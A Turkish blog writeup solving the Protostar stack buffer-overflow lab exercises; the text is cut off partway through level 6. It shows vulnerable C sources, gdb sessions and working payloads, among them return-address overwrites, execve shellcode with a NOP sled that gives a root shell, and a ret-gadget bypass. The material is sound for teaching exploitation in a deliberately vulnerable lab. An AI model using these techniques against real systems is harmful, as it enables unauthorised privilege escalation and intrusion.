---
title: "Protostar Stack Writeup"
date: 2020-11-29T16:27:00-0400
categories:
  - Binary Exploitation
tags:
  - protostar
  - exploit
---
# Protostar Stack Writeup


`Ön tavsiye`: bu yazıyı okumadan önce stack nedir ve nasıl çalışır, fonksiyon çağrıları nasıl olur, register nedir ne iş yapar gibi kavram ve konular hakkında ufaktan bi fikrinizin olması faydalı olacaktır.

Öncelikle protostar makinesini indirip sanal makine olarak kurmanız gerekmekte, ardından ssh ile makineye bağlanabilirsiniz. soruların binary dosyaları /opt/protostar/bin/ dizini altında yer almakta. Başlayalım :)
## Stack 0

Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
Bu aşamada amacımız if bloğunda yer alan başarı mesajını ekrana bastırabilmek. Bu bloğun öncesinde `modified` isminde bir değişken ve 64 byte boyutunda bir buffer(dizi) tanımlamış. `modified` değişkenine 0 atamış, biizm amacımız bunun üzerine yazıp mesajı bastırmak.
```bash
user@protostar:/opt/protostar/bin$ ./stack0
AAAAAAAAAAA
Try again?
user@protostar:/opt/protostar/bin$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again?
user@protostar:/opt/protostar/bin$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
```
Gördüğünüz gibi 64 adet A karakteri verdiğimizde buffer normal bir şekilde doluyor ancak 64'ten fazla vermeye başladığımız anda kendi alanımızı taşırıp bizden hemen önce stackte yer edinen modified değişkenine yazmaya başladık ve sonuç olarak mesajı ekrana yazdırdık.

## Stack 1

Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Burada amacımız yine ekrana başarı mesajını yazdırmak ancak ufak farklılıklar var. Yine `modified` değişkeni ve buffer dizisi tanımlanmış, ardından argüman sayısı kontrol edilmiş. Eğer argüman sayısı 1 ise argüman vermemişsin diye bizi uyarıyor.(c'de argv[0] programın kendi ismini tutar) Ardından if bloğunda modified değişkeninin değerinin `0x61626364` olup olmadığını kontrol ediyor yani bizim taşma sırasında vereceğimiz değer bu olmalı. Bu değer hex olarak ifade edilmiş, ascii tablosuna bakarsak (man ascii ile bakabilirsiniz) bu değerler `abcd` harlerine karşılık geliyor. Ancak burada hedef makine little-endian olduğu için bunları tersten yazmamız gerekli. [Endianness](https://en.wikipedia.org/wiki/Endianness) 

```bash
user@protostar:/opt/protostar/bin$ ./stack1
stack1: please specify an argument

user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Try again, you got 0x42424242
user@protostar:/opt/protostar/bin$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```
Argüman vermediğimizde kızdı, ardından 64 tane 'A' verdik ve bize değerin 0 olduğunu söyledi çünkü modified değerini ezemedik. Ardından 64 karakter ve `dcba` stringi ile denediğimizde başarılı bir şekilde değiştirmiş olduk.

## Stack 2

Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Burada işler biraz daha farklılaşıyor. Yine modified ve buffer var ancak char pointer tipinde bir variable gelmiş. Bu varible içerisine `GREENIE` isimli ortam değişkenini (bkz. [environment variables](https://en.wikipedia.org/wiki/Environment_variable)) alıp ardından bu veriyi buffer içerisine kopyalıyor. Burada dikkat edilmesi gereken nokta ise bunu `strcpy` ile yapması, bu fonksiyonun man sayfasına bakarsak şöyle bir ibare yer alıyor.
```
BUGS
If  the  destination  string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.  Any time a program reads or copies data into a buffer, the program first needs to check that there's enough space.  This may  be  unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.
```
Yani diyo ki bu adam kopyalanacak yerin boyutunu kontrol etmeden kopyalıyor, bu sebepten ötürü yazmaması gerekn yere bir şeyler yazıp ortalığı karıştırabilir stackde devamına yazmaya başlar. Bizim de burada amacımız bu :)

Öncelikle `GREENIE` ortam değişkenine inputumuzu yazalım. 64 tane 'A' ile bufferi doldurup ardından `0x0d0a0d0a` değerini ekleyerek istenen değeri modified'a yazacağız.
```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")

user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```
Burada `$()` şeklinde bir kullanım ile içerisinde çalıştırdığımız kodu output olarak alıp export ile ortam değişkenine atadık.(bkz.[Nedir bu $()](https://stackoverflow.com/questions/27472540/difference-between-and-in-bash/27472808))
Başarılı bir şekilde bu aşamayı da tamamlamış olduk.

## Stack 3
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Burada en başta `fp` isminde bir fonksiyon pointeri tanımlamış ve bu pointera 0 atamış. Bizim amacımız ise bu adresi `win` fonksiyonunun adresi ile değiştirip fonksiyonu çağırmak. Fonksiyonu çağırma işini de kendisi if bloğu içinde yapmış zaten.
```bash
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
calling function pointer, jumping to 0x42424242
Segmentation fault
```
64 tane 'A' ve 4 tane 'B' verdiğimizde fonksiyon pointerini B ile ezebildik ancak bu adrese gidemediği için segmentation fault hatası verdi, 'B' lerin yerine win fonksiyonunun adresini yazacağız. Fonksiyonun adresini öğrenmek için objdump kullanabiliriz. (bkz.[objdump](https://en.wikipedia.org/wiki/Objdump))
```bash
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 <win>:
```
-d ile dissasemble edip içinden win greplediğimizde adresin `08048424` olduğunu görüyoruz. Bunu 64 karakterin arkasına ekleyip çalıştıralim.

```bash
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08
calling function pointer, jumping to 0x3432785c
Segmentation fault

user@protostar:/opt/protostar/bin$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08" | ./stack3
calling function pointer, jumping to 0x3432785c
Segmentation fault

user@protostar:/opt/protostar/bin$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
Burada input verirken dikkat etmemiz gereken şey içerisindeki backslash (`\`) karakteri. Programa direkt olarak inputu verdiğimizde bu karakterleri de text olarak kabul edip yanlış çalışıyor, bunu engellemek için echo komutunu -e parametresi ile çalıştırabiliriz, -e parametresi ile backslash escape fonksiyonu enable ediliyor. Tabii bunun yerine python ile de yapabiliriz.
```bash
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*64 + '\x24\x84\x04\x08'") | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
Bu aşamayı da başarılı bir şekilde tamamladık.

## Stack 4
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Bu aşamada sadece gets ile veri okuyan bir main fonksiyonumuz ve hedefimiz olan win fonksiyonumuz var. Amacımız win fonksiyonunu çağırmak. Bunu yapmak için yine buffer'ı taşırıp win fonksiyonunun adresini bu sefer return adresinin bulunduğu noktaya yazacağız. Stackte lokal değişkenlerin hemen altında pushlanmış ebp değeri ve ardından return adresi bulunmakta. Biz return adresini ezip win fonksiyonunun adresini yazarsak fonksiyondan dönerken bizim win fonksiyonumuza gider ve onun kodlarını çalıştırır.
Win fonksiyonunun adresini bulalım.
```bash
user@protostar:/opt/protostar/bin$ objdump -d stack4 | grep win
080483f4 <win>:
```
Win fonksiyonunun adresi `080483f4` miş. 64 karakter verip ardından bu adresi yazarsak çalışır mı???
```bash
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*64 + '\x24\x84\x04\x08'") | ./stack4
user@protostar:/opt/protostar/bin$ 
```
Çalışmaz, çünkü 64 karakterden sonra return adresine yazamıyoruz. Arada ebp var ve ayrıca compiler da padding için değişiklikler yapmış olabilir. Ne kadar karakterden sonra yazacağımızı bir pattern kullanarak bulabiliriz. Pattern oluşturmak için gdb vs kullanabilirsiniz veya [şuradan](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) faydalanabilirsiniz.

```bash
user@protostar:/opt/protostar/bin$ ./stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Segmentation fault
```
Eee? Segmentation fault verdi ama patlayan adresi yazmadı, bu adresi öğrenmek için [dmesg](https://en.wikipedia.org/wiki/Dmesg) komutunu kullanabilirsiniz.
```bash
user@protostar:/opt/protostar/bin$ dmesg | tail -5
[ 3992.532519] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
[ 8341.144247] stack3[1695]: segfault at 42424242 ip 42424242 sp bffff63c error 4
[ 8732.012231] stack3[1708]: segfault at 3432785c ip 3432785c sp bffff63c error 4
[ 8881.672222] stack3[1712]: segfault at 3432785c ip 3432785c sp bffff63c error 4
[ 9862.991956] stack4[1737]: segfault at 63413563 ip 63413563 sp bffff6b0 error 4
```
Son hataya baktığımzıda stack4 de `63413563` adresinde patlamış. Bunu patterni oluşturduğumuz yerde aratırsak bize 76 sonucunu veriyor.(Bu adres little endian, pattern offset finderlar genelde bunu kendisi çevirip arıyor yani sizin çevirmenize gerek kalmıyor) Yani 76 karakter yazdıktan sonra biz return adresine yazıyomuşuz. O zaman 76 tane 'A' verip ardından adresi yazarsak çalışması gerekir.
```bash
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*76 + '\xf4\x83\x04\x08'") | ./stack4
code flow successfully changed
Segmentation fault
```
İstediğimzi mesajı başarılı bir şekilde yazdırmış olduk. Sondaki seg faultun sebebi ise bizim return adresini bozmamız sebebiyle programın düzgün bir şekilde exit yapamamasından dolayı diyebiliriz.
## Stack 5
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Bu sefer hiçbir şey yok??? Burada amacımız stack içerisine shellcode yazıp bu shellcodeu kullanarak root yetkisi ile shell almak. Bunu yaparkan 2 farklı şekilde deneyebilirsiniz, ya return adresine yazana kadar doldurduğumuz bufferın içine shellcode ekler ve oraya zıplayacak şekilde return adresi yazarız ya da shellcode'umuzu return adresinin de ilerisine(yani daha yüksek adresli tarafa) yazarak oraya zıplayıp çalıştırabiliriz. Ben burada buffer içerisine yazmayı deneyeceğim. Önce bakalım kaç byte doldurmamız gerekiyor.
```bash
user@protostar:/opt/protostar/bin$ ./stack5
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Segmentation fault

user@protostar:/opt/protostar/bin$ dmesg | tail -1
[12631.587253] stack5[1767]: segfault at 63413563 ip 63413563 sp bffff6b0 error 4
```
`63413563` değerinin ofseti 76. Biz bu 76 byte içerisine zararlı kodumuzu yerleştireceğiz. ben bu denememizde [şu](http://shell-storm.org/shellcode/files/shellcode-811.php) kodu kullanacağım:
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
Kodun toplam boyutu 28 byte, bizim dolduracağımız alan ise 76 byte idi. Bu alanı 44 + 28 + 4 + 4 olarak ayırabiliriz. Burada ilk 44 bytelık bölümü nop (\x90) ile dolduracağım. Nop komutu işlemcide boş komut gibi bir şey diyebiliriz. Herhangi bir işlem yapmadan geçiyor yani. Ben de ilk bölümü nop ile doldurarak atlama alanımı geniş tutmaya çalışıyorum. Nop olan bi yere zıplaıktan sonra işlemci nopları atlaya atlaya gidip bizim shellcodeumuza gelecek ve onu çalıştıracak. Bunu basit bi python scriptine çevirebiliriz:
```python
nops = '\x90'*44
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
ebp = "B"*4
return_addr = 
```
Şimdi atlayacağımız adresi bulmamız lazım. Programı gdb ile açıp bakalım.
0xbffff634
```bash
user@protostar:/tmp$ gdb /opt/protostar/bin/stack5 -q
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
(gdb) b* 0x080483ca
Breakpoint 1 at 0x80483ca: file stack5/stack5.c, line 7.
(gdb) b*0x080483da
Breakpoint 2 at 0x80483da: file stack5/stack5.c, line 11.
.
.
.(buaraları atlıyorum)
.
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDD

Breakpoint 2, 0x080483da in main (argc=Cannot access memory at address 0x4343434b
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb) i r
eax            0xbffff620	-1073744352
ecx            0xbffff620	-1073744352
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff66c	0xbffff66c
ebp            0x43434343	0x43434343
esi            0x0	0
edi            0x0	0
eip            0x80483da	0x80483da <main+22>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/60x $esp-100
0xbffff608:	0xbffff668	0x080483d9	0xbffff620	0xb7ec6165
0xbffff618:	0xbffff628	0xb7eada75	0x41414141	0x41414141
0xbffff628:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff638:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff648:	0x41414141	0x42424242	0x42424242	0x42424242
0xbffff658:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff668:	0x43434343	0x44444444	0x00000000	0xbffff714
0xbffff678:	0xbffff71c	0xb7fe1848	0xbffff6d0	0xffffffff
0xbffff688:	0xb7ffeff4	0x08048232	0x00000001	0xbffff6d0
0xbffff698:	0xb7ff0626	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4
0xbffff6a8:	0x00000000	0x00000000	0xbffff6e8	0x6b1fead5
0xbffff6b8:	0x414b7cc5	0x00000000	0x00000000	0x00000000
0xbffff6c8:	0x00000001	0x08048310	0x00000000	0xb7ff6210
0xbffff6d8:	0xb7eadb9b	0xb7ffeff4	0x00000001	0x08048310
0xbffff6e8:	0x00000000	0x08048331	0x080483c4	0x00000001
(gdb) si
Cannot access memory at address 0x43434347
(gdb) x/60x $esp-100
0xbffff60c:	0x080483d9	0xbffff620	0xb7ec6165	0xbffff628
0xbffff61c:	0xb7eada75	0x41414141	0x41414141	0x41414141
0xbffff62c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff63c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff64c:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff65c:	0x42424242	0x42424242	0x42424242	0x43434343
0xbffff66c:	0x44444444	0x00000000	0xbffff714	0xbffff71c
0xbffff67c:	0xb7fe1848	0xbffff6d0	0xffffffff	0xb7ffeff4
0xbffff68c:	0x08048232	0x00000001	0xbffff6d0	0xb7ff0626
0xbffff69c:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
0xbffff6ac:	0x00000000	0xbffff6e8	0x6b1fead5	0x414b7cc5
0xbffff6bc:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff6cc:	0x08048310	0x00000000	0xb7ff6210	0xb7eadb9b
0xbffff6dc:	0xb7ffeff4	0x00000001	0x08048310	0x00000000
0xbffff6ec:	0x08048331	0x080483c4	0x00000001	0xbffff714
(gdb) i r
eax            0xbffff620	-1073744352
ecx            0xbffff620	-1073744352
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff670	0xbffff670
ebp            0x43434343	0x43434343
esi            0x0	0
edi            0x0	0
eip            0x44444444	0x44444444
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) q

```
Burada programı çalıştırmadan önce mainden çıkmadan breakpoint koyduk ki stack ne durumda bakabilelim. İnput olarak 'A'*44 + 'B'*28 + 'C'*4 + 'D'*4  verdik. Beklenen oldu ve return adresine DDDD yazıldı. Burada bffff638 adresine zıplayabilriz. Başka adres de seçebilirsiniz tabii :) Final kodumuz:
```python
nops = '\x90'*44
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
ebp = "B"*4
return_addr = "\x38\xf6\xff\xbf"

print nops + shellcode + ebp + return_addr
```
Şimdi bu kodu input olarak vermemiz lazım, bunu yaparken direk çalıştırısak stack5.py programı işini bitip çıkacak ama stack5 komut çalıştıramadan kapanmış olacak, bunun için cat komutu ekleyerek bunu atlatıyoruz. cat komutuna parametre vermeden çalıştırısak verlen inputu 2 kere basar.
```bash
user@protostar:/tmp$ (python stack5.py ; cat)| /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
Böylece bu adımı da tamamlamış olduk. Bu aşamayı daha farklı yöntemlerle çözebilirdik ancak onlara ileride değiniriz.

## Stack 6
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{

  getpath();

}
```
Bu aşamada main fonksiyonda sadece getpath fonksiyonu çağırılmış. Bu fonksiyonun içinde ise bizden bir path istiyor ve ardından fonksiyonun return adresini `__builtin_return_address(0)` fonksiyonu ile alıp `ret` isimli değişkene atıyor. İf bloğunda bu değişken ile `0xbf000000` değerini and işlemine sokuyor. eğer sonuç `0xbf000000` ise programdan çıkıyor.Aksi durumda ise ekrana path'i yazdırıyor. Burada yapılan and işleminde eğer bizim return adresimiz 0xbf ile başlıyor ise sonuç true döneceği için bunu atlatmamız lazım. Gdb üzerinden programa ayrılam memory bölümlerini görelim. Bunun için proc map kullanacağız. bkz.[proc map](https://stackoverflow.com/questions/6814217/what-is-a-proc-map) 
```bash
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) r
Starting program: /opt/protostar/bin/stack6 

Breakpoint 1, main (argc=1, argv=0xbffff714) at stack6/stack6.c:27
27	stack6/stack6.c: No such file or directory.
	in stack6/stack6.c
(gdb) info proc map
process 2001
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
```
Son satırda görüldüğü gibi satck alanı 0xbf ile başlıyor. Peki biz nereye atlayacağız ve root olarak shell alacağız? Burada Liveoverflow'un videosunda gördüğüm yöntem ile anlatacağım ancak rop veya ret2libc ile de çözebilirsiniz. Ret2libc ile çözümü de stack7 de yapacağız. <br>
Neyse şimdi bizim burada kullanacağımız yönteme gelelim. Biz bf ile başlayan adrese dönemiyorduk. Şimdi kaç bytedan sonra return adresine yazıyoruz ona bakalım.
```bash
user@protostar:/opt/protostar/bin$ ./stack6
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Segmentation fault
user@protostar:/opt/protostar/bin$ dmesg |tail -1
[20257.860054] stack6[2018]: segfault at 37634136 ip 37634136 sp bffff6a0 error 4
```
Segfault veren değeriin foseti 80 olarak karşımıza çıkıyor. O zaman şu şekilde bir stack yapısı oluşturabiliriz:
```
36*NOP + shellcode(28 byte) + 12*A + 4*B + return_address
```
E ama biz bf li adrese dönemiyoduk, onu çözecektik. Gdb ile getpath fonksiyonunu disassembly edelim.
```bash
(gdb) disas getpath 
Dump of assembler code for function getpath:
0x08048484 <getpath+0>:	push   %ebp
0x08048485 <getpath+1>:	mov    %esp,%ebp
0x08048487 <getpath+3>:	sub    $0x68,%esp
0x0804848a <getpath+6>:	mov    $0x80485d0,%eax
0x0804848f <getpath+11>:	mov    %eax,(%esp)
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    0x8049720,%eax
0x0804849c <getpath+24>:	mov    %eax,(%esp)
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:	mov    %eax,(%esp)
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    0x4(%ebp),%eax
0x080484b2 <getpath+46>:	mov    %eax,-0xc(%ebp)
0x080484b5 <getpath+49>:	mov    -0xc(%ebp),%eax
0x080484b8 <getpath+52>:	and    $0xbf000000,%eax
0x080484bd <getpath+57>:	cmp    $0xbf000000,%eax
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    $0x80485e4,%eax
0x080484c9 <getpath+69>:	mov    -0xc(%ebp),%edx
0x080484cc <getpath+72>:	mov    %edx,0x4(%esp)
0x080484d0 <getpath+76>:	mov    %eax,(%esp)
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	movl   $0x1,(%esp)
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    $0x80485f0,%eax
0x080484e9 <getpath+101>:	lea    -0x4c(%ebp),%edx
0x080484ec <getpath+104>:	mov    %edx,0x4(%esp)
0x080484f0 <getpath+108>:	mov    %eax,(%esp)
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret    
End of assembler dump.
``` 
Burada son satırda bulunan `ret` komutunun adresine bakarsanız bf ile başlamıyor. Eğer biz return adresimizi bu komutun adresi ile ezersek ve arkasına da shellcode adresimizi koyarsak ne olur? Fonksiyonan dönmeye çalışılırken `ret` komutunun adresine dönmüş oluruz ve o komut tekrar çalışmış olur. Tekrar çalıştığında da stackin en üstündeki değeri yani bizim eklemiş olduğumzu shellcode adresini çekip oradan executiona devam eder ve ksıtlamaya takılmaz çünkü biz o kısıtlamayı ilk returnde atlatmıştık.  <br>
Bizim stack layoutumuz şuan dönüştü o zaman:
```
36*NOP + shellcode(28 byte) + 12*A + 4*B + return_address_of_ret_instruction + shellcode_address
```
Bunu python ile oluşturmaya çalışalım:
```python
nops = '\x90'*36
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
junk = "A"*12 + "B"*4
return_addr_of_ret = "\xf9\x84\x04\x08" #0x080484f9
shellcode_addr = "C"*4

print nops + shellcode + junk + return_addr_of_ret + shellcode_addr
```
Şimdi shellcode'a zıplayacağımzı adresi bulmamız lazım. Gdb ile tekrar bakalım:
```bash
(gdb) set disassembly-flavor intel
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) r
Starting program: /opt/protostar/bin/stack6 

Breakpoint 1, main (argc=1, argv=0xbffff714) at stack6/stack6.c:27
27	stack6/stack6.c: No such file or directory.
	in stack6/stack6.c
(gdb) disas getpath 
Dump of assembler code for function getpath:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
